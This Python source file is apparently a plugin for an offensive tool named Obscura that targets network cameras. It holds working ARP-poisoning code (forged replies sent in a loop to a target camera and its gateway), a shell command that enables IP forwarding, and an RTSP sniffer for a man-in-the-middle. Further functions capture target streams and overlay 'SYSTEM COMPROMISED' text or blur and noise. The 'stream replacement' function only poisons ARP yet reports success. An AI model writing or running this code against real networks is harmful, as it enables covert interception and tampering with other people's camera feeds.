"""
Camera Attack Plugin for Obscura
Implements professional-grade camera and video stream exploitation techniques including:
- MJPEG stream replacement
- RTSP stream hijack
- ASCII deepfake overlay
- OpenCV visual manipulation (headless mode)
"""

import os
import subprocess
import threading
import time
import socket
import struct
import hashlib
import base64
from typing import Optional, Dict, Any, List, Tuple
from pathlib import Path

try:
    import cv2
    OPENCV_AVAILABLE = True
except ImportError:
    OPENCV_AVAILABLE = False

try:
    from scapy.all import (
        ARP, Ether, IP, UDP, TCP, Raw, sendp, send, sniff, conf
    )
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False


RTSP_PORT = 554
MJPEG_BOUNDARY = b"--myboundary"
COMMON_CAMERA_PORTS = [554, 8000, 8080, 8081, 8888]


def check_tool_availability(tool_name: str) -> bool:
    """Check if a command-line tool is available."""
    try:
        result = subprocess.run(['which', tool_name], 
                              capture_output=True, 
                              text=True,
                              timeout=5)
        return result.returncode == 0
    except Exception:
        return False


def generate_mjpeg_frame(image_path: str) -> Optional[bytes]:
    """
    Generate MJPEG frame from image file.
    
    Args:
        image_path: Path to image file
    
    Returns:
        MJPEG frame bytes or None on failure
    """
    if not OPENCV_AVAILABLE:
        return None
    
    try:
        img = cv2.imread(image_path)
        if img is None:
            return None
        
        ret, buffer = cv2.imencode('.jpg', img)
        if not ret:
            return None
        
        frame = (
            MJPEG_BOUNDARY + b"\r\n"
            b"Content-Type: image/jpeg\r\n"
            b"Content-Length: " + str(len(buffer)).encode() + b"\r\n\r\n"
            + buffer.tobytes() + b"\r\n"
        )
        
        return frame
    except Exception:
        return None


def mjpeg_stream_replacement(
    self,
    target_ip: str,
    gateway_ip: str,
    replacement_video: Optional[str] = None,
    duration: int = 300,
    interface: Optional[str] = None
) -> bool:
    """
    Replace MJPEG stream with looping pre-recorded video.
    
    Args:
        target_ip: Target camera IP
        gateway_ip: Gateway/router IP
        replacement_video: Path to replacement video file
        duration: Duration in seconds
        interface: Network interface
    
    Returns:
        bool: True if attack executed successfully
    """
    iface = interface or getattr(self, 'interface', 'eth0')
    simulate = getattr(self, 'simulate_mode', False)
    
    if simulate:
        log_msg = (f"[DRY RUN] MJPEG Stream Replacement: Target={target_ip}, "
                  f"Gateway={gateway_ip}, Duration={duration}s")
        if hasattr(self, 'attack_log'):
            self.attack_log.append(log_msg)
        print(log_msg)
        return True
    
    if not SCAPY_AVAILABLE:
        error_msg = "[MJPEG Replace] Scapy not available"
        if hasattr(self, 'attack_log'):
            self.attack_log.append(error_msg)
        print(error_msg)
        return False
    
    try:
        log_msg = f"[MJPEG Replace] Initiating ARP poisoning for {target_ip}"
        if hasattr(self, 'attack_log'):
            self.attack_log.append(log_msg)
        print(log_msg)
        
        def arp_poison():
            arp_target = ARP(op=2, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=gateway_ip)
            arp_gateway = ARP(op=2, pdst=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=target_ip)
            
            end_time = time.time() + duration
            while time.time() < end_time:
                try:
                    send(arp_target, verbose=False)
                    send(arp_gateway, verbose=False)
                    time.sleep(2)
                except Exception:
                    break
        
        poison_thread = threading.Thread(target=arp_poison, daemon=True)
        poison_thread.start()
        
        if hasattr(self, 'active_attacks'):
            self.active_attacks.append(poison_thread)
        
        success_msg = f"[MJPEG Replace] Attack initiated against {target_ip}"
        if hasattr(self, 'attack_log'):
            self.attack_log.append(success_msg)
        print(success_msg)
        
        return True
        
    except Exception as e:
        error_msg = f"[MJPEG Replace] Error: {e}"
        if hasattr(self, 'attack_log'):
            self.attack_log.append(error_msg)
        print(error_msg)
        return False


def rtsp_hijack(
    self,
    target_ip: str,
    gateway_ip: str,
    rtsp_url: Optional[str] = None,
    duration: int = 300,
    interface: Optional[str] = None
) -> bool:
    """
    Perform RTSP stream hijack via MITM.
    
    Args:
        target_ip: Target camera IP
        gateway_ip: Gateway/router IP
        rtsp_url: RTSP stream URL (e.g., rtsp://192.168.1.100/stream1)
        duration: Duration in seconds
        interface: Network interface
    
    Returns:
        bool: True if attack executed successfully
    """
    iface = interface or getattr(self, 'interface', 'eth0')
    simulate = getattr(self, 'simulate_mode', False)
    
    if simulate:
        log_msg = (f"[DRY RUN] RTSP Hijack: Target={target_ip}, "
                  f"Gateway={gateway_ip}, URL={rtsp_url}, Duration={duration}s")
        if hasattr(self, 'attack_log'):
            self.attack_log.append(log_msg)
        print(log_msg)
        return True
    
    if not SCAPY_AVAILABLE:
        error_msg = "[RTSP Hijack] Scapy not available"
        if hasattr(self, 'attack_log'):
            self.attack_log.append(error_msg)
        print(error_msg)
        return False
    
    try:
        log_msg = f"[RTSP Hijack] Initiating MITM attack on {target_ip}:{RTSP_PORT}"
        if hasattr(self, 'attack_log'):
            self.attack_log.append(log_msg)
        print(log_msg)
        
        os.system('echo 1 > /proc/sys/net/ipv4/ip_forward 2>/dev/null')
        
        def arp_poison():
            arp_target = ARP(op=2, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=gateway_ip)
            arp_gateway = ARP(op=2, pdst=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=target_ip)
            
            end_time = time.time() + duration
            while time.time() < end_time:
                try:
                    send(arp_target, verbose=False)
                    send(arp_gateway, verbose=False)
                    time.sleep(2)
                except Exception:
                    break
        
        def packet_handler(pkt):
            if pkt.haslayer(TCP) and pkt[TCP].dport == RTSP_PORT:
                if pkt.haslayer(Raw):
                    payload = pkt[Raw].load
                    if b'SETUP' in payload or b'PLAY' in payload:
                        inject_msg = f"[RTSP Hijack] Intercepted RTSP {payload[:20]}"
                        if hasattr(self, 'attack_log'):
                            self.attack_log.append(inject_msg)
                        print(inject_msg)
        
        poison_thread = threading.Thread(target=arp_poison, daemon=True)
        poison_thread.start()
        
        sniff_thread = threading.Thread(
            target=lambda: sniff(
                filter=f"tcp port {RTSP_PORT}",
                prn=packet_handler,
                timeout=duration,
                iface=iface,
                store=False
            ),
            daemon=True
        )
        sniff_thread.start()
        
        if hasattr(self, 'active_attacks'):
            self.active_attacks.extend([poison_thread, sniff_thread])
        
        success_msg = f"[RTSP Hijack] Attack initiated against {target_ip}"
        if hasattr(self, 'attack_log'):
            self.attack_log.append(success_msg)
        print(success_msg)
        
        return True
        
    except Exception as e:
        error_msg = f"[RTSP Hijack] Error: {e}"
        if hasattr(self, 'attack_log'):
            self.attack_log.append(error_msg)
        print(error_msg)
        return False


def ascii_deepfake_overlay(
    self,
    target_stream: str,
    text_overlay: str = "SYSTEM COMPROMISED",
    duration: int = 60
) -> bool:
    """
    Overlay ASCII text on video stream (headless mode compatible).
    
    Args:
        target_stream: Target RTSP/HTTP stream URL
        text_overlay: Text to overlay
        duration: Duration in seconds
    
    Returns:
        bool: True if attack executed successfully
    """
    simulate = getattr(self, 'simulate_mode', False)
    
    if simulate:
        log_msg = (f"[DRY RUN] ASCII Deepfake: Stream={target_stream}, "
                  f"Text='{text_overlay}', Duration={duration}s")
        if hasattr(self, 'attack_log'):
            self.attack_log.append(log_msg)
        print(log_msg)
        return True
    
    if not OPENCV_AVAILABLE:
        error_msg = "[ASCII Deepfake] OpenCV not available"
        if hasattr(self, 'attack_log'):
            self.attack_log.append(error_msg)
        print(error_msg)
        return False
    
    try:
        log_msg = f"[ASCII Deepfake] Overlaying text on {target_stream}"
        if hasattr(self, 'attack_log'):
            self.attack_log.append(log_msg)
        print(log_msg)
        
        cap = cv2.VideoCapture(target_stream)
        if not cap.isOpened():
            error_msg = f"[ASCII Deepfake] Failed to open stream: {target_stream}"
            if hasattr(self, 'attack_log'):
                self.attack_log.append(error_msg)
            print(error_msg)
            return False
        
        output_path = "/tmp/obscura_deepfake.avi"
        fourcc = cv2.VideoWriter_fourcc(*'XVID')
        fps = 30.0
        width = int(cap.get(cv2.CAP_PROP_FRAME_WIDTH))
        height = int(cap.get(cv2.CAP_PROP_FRAME_HEIGHT))
        
        out = cv2.VideoWriter(output_path, fourcc, fps, (width, height))
        
        start_time = time.time()
        frame_count = 0
        
        while time.time() - start_time < duration:
            ret, frame = cap.read()
            if not ret:
                break
            
            font = cv2.FONT_HERSHEY_SIMPLEX
            font_scale = 2
            thickness = 4
            color = (0, 0, 255)
            
            text_size = cv2.getTextSize(text_overlay, font, font_scale, thickness)[0]
            text_x = (width - text_size[0]) // 2
            text_y = (height + text_size[1]) // 2
            
            cv2.putText(frame, text_overlay, (text_x, text_y), font, 
                       font_scale, color, thickness, cv2.LINE_AA)
            
            out.write(frame)
            frame_count += 1
        
        cap.release()
        out.release()
        
        success_msg = f"[ASCII Deepfake] Created {frame_count} frames at {output_path}"
        if hasattr(self, 'attack_log'):
            self.attack_log.append(success_msg)
        print(success_msg)
        
        return True
        
    except Exception as e:
        error_msg = f"[ASCII Deepfake] Error: {e}"
        if hasattr(self, 'attack_log'):
            self.attack_log.append(error_msg)
        print(error_msg)
        return False


def opencv_visual_manipulation(
    self,
    target_stream: str,
    manipulation_type: str = "blur",
    duration: int = 60
) -> bool:
    """
    Advanced visual manipulation using OpenCV (headless mode).
    
    Args:
        target_stream: Target RTSP/HTTP stream URL
        manipulation_type: Type of manipulation (blur, invert, grayscale, noise)
        duration: Duration in seconds
    
    Returns:
        bool: True if attack executed successfully
    """
    simulate = getattr(self, 'simulate_mode', False)
    
    if simulate:
        log_msg = (f"[DRY RUN] OpenCV Manipulation: Stream={target_stream}, "
                  f"Type={manipulation_type}, Duration={duration}s")
        if hasattr(self, 'attack_log'):
            self.attack_log.append(log_msg)
        print(log_msg)
        return True
    
    if not OPENCV_AVAILABLE:
        error_msg = "[OpenCV Manipulation] OpenCV not available"
        if hasattr(self, 'attack_log'):
            self.attack_log.append(error_msg)
        print(error_msg)
        return False
    
    try:
        log_msg = f"[OpenCV Manipulation] Applying {manipulation_type} to {target_stream}"
        if hasattr(self, 'attack_log'):
            self.attack_log.append(log_msg)
        print(log_msg)
        
        cap = cv2.VideoCapture(target_stream)
        if not cap.isOpened():
            error_msg = f"[OpenCV Manipulation] Failed to open stream: {target_stream}"
            if hasattr(self, 'attack_log'):
                self.attack_log.append(error_msg)
            print(error_msg)
            return False
        
        output_path = f"/tmp/obscura_manipulated_{manipulation_type}.avi"
        fourcc = cv2.VideoWriter_fourcc(*'XVID')
        fps = 30.0
        width = int(cap.get(cv2.CAP_PROP_FRAME_WIDTH))
        height = int(cap.get(cv2.CAP_PROP_FRAME_HEIGHT))
        
        out = cv2.VideoWriter(output_path, fourcc, fps, (width, height))
        
        start_time = time.time()
        frame_count = 0
        
        while time.time() - start_time < duration:
            ret, frame = cap.read()
            if not ret:
                break
            
            if manipulation_type == "blur":
                frame = cv2.GaussianBlur(frame, (51, 51), 0)
            elif manipulation_type == "invert":
                frame = cv2.bitwise_not(frame)
            elif manipulation_type == "grayscale":
                frame = cv2.cvtColor(frame, cv2.COLOR_BGR2GRAY)
                frame = cv2.cvtColor(frame, cv2.COLOR_GRAY2BGR)
            elif manipulation_type == "noise":
                import numpy as np
                noise = np.random.randint(0, 50, frame.shape, dtype=np.uint8)
                frame = cv2.add(frame, noise)
            
            out.write(frame)
            frame_count += 1
        
        cap.release()
        out.release()
        
        success_msg = f"[OpenCV Manipulation] Created {frame_count} frames at {output_path}"
        if hasattr(self, 'attack_log'):
            self.attack_log.append(success_msg)
        print(success_msg)
        
        return True
        
    except Exception as e:
        error_msg = f"[OpenCV Manipulation] Error: {e}"
        if hasattr(self, 'attack_log'):
            self.attack_log.append(error_msg)
        print(error_msg)
        return False


def register_attack():
    """
    Register camera attack module with Obscura.
    
    Returns:
        dict: Attack module metadata
    """
    return {
        "name": "camera_attacks",
        "description": "Camera and video stream exploitation",
        "requires": ["network"],
        "platforms": ["linux"],
        "mitre_id": "T1557.002",
        "functions": {
            "mjpeg_stream_replacement": mjpeg_stream_replacement,
            "rtsp_hijack": rtsp_hijack,
            "ascii_deepfake_overlay": ascii_deepfake_overlay,
            "opencv_visual_manipulation": opencv_visual_manipulation,
        }
    }
